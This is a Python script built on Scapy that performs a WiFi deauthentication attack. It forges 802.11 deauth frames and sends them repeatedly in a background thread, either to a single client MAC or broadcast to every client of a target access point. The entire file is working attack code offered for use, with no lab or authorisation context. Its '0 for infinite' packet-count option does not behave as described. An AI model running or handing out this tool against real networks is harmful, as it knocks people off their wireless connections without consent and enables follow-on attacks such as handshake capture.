import sys
import threading
import time
import argparse
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth

# Function to send deauth packets to a specific client or broadcast
def send_deauth(interface, target_bssid, client_mac=None, count=0):
    if client_mac:
        # Sending directed deauth
        print(f"Sending 64 directed DeAuth (code 0x{0x0c:X}). STMAC: {client_mac} to {target_bssid}")
        deauth_pkt = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
        sendp(deauth_pkt, iface=interface, count=count, verbose=False)
    else:
        # Sending broadcast deauth
        print(f"Sending DeAuth (code 0x{0x0c:X}) to broadcast -- BSSID {target_bssid}")
        deauth_pkt = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
        sendp(deauth_pkt, iface=interface, count=count, verbose=False)

# Function to handle multi-threading for deauth attacks
def attack(interface, target_bssid, client_mac, count):
    try:
        while True:
            send_deauth(interface, target_bssid, client_mac, count)
            time.sleep(0.1)  # Small delay to avoid overloading the network
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")

# Main function to parse arguments and execute attack
def main():
    # Set up argument parser
    parser = argparse.ArgumentParser(description="Perform a deauthentication attack on a WiFi network.")
    parser.add_argument("count", type=int, help="Number of deauth packets to send (0 for infinite).")
    parser.add_argument("-a", "--ap_mac", required=True, help="Target AP MAC address (BSSID).")
    parser.add_argument("-c", "--client_mac", help="Client MAC address (optional, send to all clients if omitted).")
    parser.add_argument("interface", help="Network interface (e.g., wlan0).")
    
    # Parse the command-line arguments
    args = parser.parse_args()
    
    # Start attack in a separate thread
    print(f"Starting attack on AP {args.ap_mac} with client MAC {args.client_mac if args.client_mac else 'all clients'}...")
    attack_thread = threading.Thread(target=attack, args=(args.interface, args.ap_mac, args.client_mac, args.count))
    attack_thread.start()
    
    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        attack_thread.join()

if __name__ == "__main__":
    main()
